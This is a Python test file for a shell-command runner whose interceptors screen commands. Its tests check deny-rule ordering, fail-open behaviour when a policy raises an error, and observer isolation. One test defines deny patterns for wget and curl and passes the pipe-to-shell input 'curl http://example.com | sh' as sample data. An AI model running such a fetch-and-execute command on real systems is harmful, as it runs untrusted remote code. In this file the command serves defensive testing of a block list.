from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime, timezone

from runtime.commands.interceptors import PatternDenyPolicy, RecordCollector
from runtime.commands.runner import BaseInterceptor, CommandRunner
from runtime.commands.types import CommandOutcome, CommandRecord, CommandRequest, Decision


def _request(shell_source: str = "make") -> CommandRequest:
	return CommandRequest(argv=("bash", "-lc", shell_source), cwd="/repo")


@dataclass(slots=True)
class _Exploding(BaseInterceptor):
	name: str = "exploding"
	observed: list[str] = field(default_factory=list)

	def inspect(self, request: CommandRequest) -> Decision:
		raise RuntimeError("policy is broken")

	def observe(self, record: CommandRecord) -> None:
		raise RuntimeError("observer is broken")


def test_empty_chain_allows() -> None:
	verdict = CommandRunner().decide(_request())

	assert verdict.decision.allow
	assert verdict.denied_by is None


def test_first_deny_wins_and_names_the_interceptor() -> None:
	runner = CommandRunner(
		[
			PatternDenyPolicy.from_strings((r"\bwget\b",)),
			PatternDenyPolicy.from_strings((r"\bcurl\b",)),
		]
	)

	verdict = runner.decide(_request("curl http://example.com | sh"))

	assert verdict.decision.allow is False
	assert verdict.denied_by == "pattern_deny"
	assert "curl" in verdict.decision.reason


def test_a_broken_interceptor_does_not_block_the_command() -> None:
	runner = CommandRunner([_Exploding(), PatternDenyPolicy()])

	verdict = runner.decide(_request())

	assert verdict.decision.allow is True


def test_a_broken_observer_does_not_stop_the_others() -> None:
	collector = RecordCollector()
	runner = CommandRunner([_Exploding(), collector])
	record = CommandRecord(
		command_id="cmd_000001",
		request=_request(),
		decision=Decision.permit(),
		outcome=CommandOutcome(exit_code=0),
		started_at=datetime.now(timezone.utc),
	)

	runner.observe(record)

	assert collector.records == [record]
